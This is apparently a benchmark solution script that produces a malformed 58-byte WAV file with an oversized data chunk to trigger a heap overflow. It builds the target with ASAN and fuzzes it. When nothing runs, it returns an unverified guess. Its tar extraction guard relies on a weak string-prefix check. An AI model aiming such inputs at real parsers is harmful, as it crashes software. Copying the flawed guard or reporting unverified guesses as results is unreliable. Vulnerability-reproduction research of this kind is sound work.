import os
import sys
import subprocess
import tempfile
import shutil
import struct
import random
import tarfile
import glob

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Vulnerability: Heap Buffer Overflow in RIFF chunk processing.
        Ground truth length: 58 bytes.
        Strategy:
        1. Attempt to compile the source code with ASAN.
        2. If successful, fuzz the binary using a template RIFF file targeting chunk size overflows.
        3. If compilation fails or fuzzing times out, return a statically generated PoC that fits the profile (58 bytes, bad chunk size).
        """
        
        # ---------------------------------------------------------
        # Static Generation (Fallback/Seed)
        # ---------------------------------------------------------
        # Construct a 58-byte RIFF/WAV file with a malformed chunk size.
        # Structure:
        # RIFF Header (12 bytes)
        # fmt chunk (24 bytes: 8 header + 16 body)
        # data chunk header (8 bytes) with overflow size
        # payload (14 bytes) to reach 58 bytes total
        
        riff_tag = b'RIFF'
        wave_tag = b'WAVE'
        fmt_tag = b'fmt '
        data_tag = b'data'
        
        # RIFF Size = Total (58) - 8 = 50
        riff_size = struct.pack('<I', 50)
        
        # fmt chunk: Size 16, PCM format
        fmt_size = struct.pack('<I', 16)
        # wFormatTag(1), nChannels(1), nSamplesPerSec(44100), nAvgBytesPerSec(88200), nBlockAlign(2), wBitsPerSample(16)
        fmt_body = struct.pack('<HHIIHH', 1, 1, 44100, 88200, 2, 16)
        
        # data chunk: Set size to 0x7FFFFFFF to trigger heap overflow when parser trusts this size
        bad_data_size = struct.pack('<I', 0x7FFFFFFF)
        
        # 14 bytes of padding to match 58 bytes
        padding = b'\x00' * 14
        
        fallback_poc = (
            riff_tag + riff_size + wave_tag +
            fmt_tag + fmt_size + fmt_body +
            data_tag + bad_data_size + padding
        )
        
        # ---------------------------------------------------------
        # Build & Fuzz
        # ---------------------------------------------------------
        base_dir = tempfile.mkdtemp()
        
        try:
            # 1. Extract Source
            if tarfile.is_tarfile(src_path):
                try:
                    with tarfile.open(src_path) as tar:
                        def is_within_directory(directory, target):
                            abs_directory = os.path.abspath(directory)
                            abs_target = os.path.abspath(target)
                            prefix = os.path.commonprefix([abs_directory, abs_target])
                            return prefix == abs_directory
                        
                        def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                            for member in tar.getmembers():
                                member_path = os.path.join(path, member.name)
                                if not is_within_directory(path, member_path):
                                    raise Exception("Attempted Path Traversal in Tar File")
                            tar.extractall(path, members, numeric_owner=numeric_owner) 
                            
                        safe_extract(tar, path=base_dir)
                except Exception:
                    # Fallback if extraction fails
                    return fallback_poc
            else:
                return fallback_poc

            # 2. Locate Build System
            src_root = base_dir
            # DFS to find configure or CMakeLists.txt
            found_build = False
            for root, dirs, files in os.walk(base_dir):
                if 'configure' in files or 'CMakeLists.txt' in files or 'Makefile' in files:
                    src_root = root
                    found_build = True
                    break
            
            if not found_build:
                return fallback_poc

            # 3. Compile with ASAN
            env = os.environ.copy()
            flags = "-fsanitize=address -g"
            env['CFLAGS'] = flags
            env['CXXFLAGS'] = flags
            env['LDFLAGS'] = flags
            
            built = False
            
            # Try Autotools
            if os.path.exists(os.path.join(src_root, 'configure')):
                try:
                    subprocess.run(
                        ['./configure', '--disable-shared'], 
                        cwd=src_root, env=env, check=True, 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    subprocess.run(
                        ['make', '-j8'], 
                        cwd=src_root, env=env, check=True, 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    built = True
                except subprocess.CalledProcessError:
                    pass
            
            # Try CMake
            if not built and os.path.exists(os.path.join(src_root, 'CMakeLists.txt')):
                try:
                    build_dir = os.path.join(src_root, 'build_fuzz')
                    os.makedirs(build_dir, exist_ok=True)
                    subprocess.run(
                        ['cmake', '..'], 
                        cwd=build_dir, env=env, check=True, 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    subprocess.run(
                        ['make', '-j8'], 
                        cwd=build_dir, env=env, check=True, 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    built = True
                    src_root = build_dir # binaries usually here
                except subprocess.CalledProcessError:
                    pass

            # Try Makefile
            if not built and os.path.exists(os.path.join(src_root, 'Makefile')):
                try:
                    subprocess.run(
                        ['make', '-j8'], 
                        cwd=src_root, env=env, check=True, 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    built = True
                except subprocess.CalledProcessError:
                    pass
            
            if not built:
                return fallback_poc

            # 4. Identify Target Binary
            # Find executable files
            candidates = []
            for root, dirs, files in os.walk(src_root):
                for f in files:
                    fp = os.path.join(root, f)
                    # Check executable and ELF header
                    if os.access(fp, os.X_OK) and not f.endswith('.sh') and not f.endswith('.py'):
                        try:
                            with open(fp, 'rb') as fb:
                                if fb.read(4) == b'\x7fELF':
                                    candidates.append(fp)
                        except:
                            pass
            
            if not candidates:
                return fallback_poc
            
            # Heuristic: shorter names are often the main CLI tools (e.g., 'wavinfo', 'imgtool')
            candidates.sort(key=lambda x: len(os.path.basename(x)))
            target_bin = candidates[0]

            # 5. Fuzzing
            # Seeds
            seeds = [fallback_poc]
            # Add a seed with mismatch but not overflow
            seeds.append(riff_tag + riff_size + wave_tag + fmt_tag + fmt_size + fmt_body + data_tag + struct.pack('<I', 100) + padding)
            
            start_time = os.times()[4]
            MAX_DURATION = 30 # seconds
            
            # Initial check
            for s in seeds:
                if self._check_crash(target_bin, s):
                    return self._minimize(target_bin, s)

            # Mutation loop
            while os.times()[4] - start_time < MAX_DURATION:
                parent = random.choice(seeds)
                child = self._mutate(parent)
                if self._check_crash(target_bin, child):
                    return self._minimize(target_bin, child)
            
            return fallback_poc

        except Exception:
            return fallback_poc
        finally:
            shutil.rmtree(base_dir, ignore_errors=True)

    def _check_crash(self, binary, data):
        with tempfile.NamedTemporaryFile(delete=False) as tf:
            tf.write(data)
            tf.close()
            try:
                env = os.environ.copy()
                # ASAN options to force exit code on error
                env['ASAN_OPTIONS'] = 'exitcode=77:abort_on_error=1'
                res = subprocess.run(
                    [binary, tf.name], 
                    stdout=subprocess.DEVNULL, 
                    stderr=subprocess.PIPE, 
                    env=env, 
                    timeout=1
                )
                if res.returncode == 77 or b'AddressSanitizer' in res.stderr:
                    return True
            except (subprocess.TimeoutExpired, Exception):
                pass
            finally:
                if os.path.exists(tf.name):
                    os.unlink(tf.name)
        return False

    def _mutate(self, data):
        arr = bytearray(data)
        if not arr: return bytes(arr)
        
        # Mutation strategies
        # 1. Mess with chunk sizes (located at 4, 16, 40 typically in our structure)
        if random.random() < 0.3:
            # 40 is data size, 4 is RIFF size
            pos = random.choice([4, 16, 40])
            if pos + 4 <= len(arr):
                val = random.choice([0xFFFFFFFF, 0x80000000, 0x7FFFFFFF, len(arr)+100, 0])
                struct.pack_into('<I', arr, pos, val)
                return bytes(arr)
        
        # 2. General byte flips
        idx = random.randint(0, len(arr)-1)
        op = random.randint(0, 2)
        if op == 0:
            arr[idx] ^= (1 << random.randint(0, 7))
        elif op == 1:
            arr[idx] = random.randint(0, 255)
        elif op == 2 and idx + 4 <= len(arr):
            struct.pack_into('<I', arr, idx, random.choice([0xFFFFFFFF, 0]))
            
        return bytes(arr)

    def _minimize(self, binary, data):
        # Target length is 58 bytes.
        current = data
        # Try to trim from end
        while len(current) > 58:
            candidate = current[:-1]
            if self._check_crash(binary, candidate):
                current = candidate
            else:
                break
        return current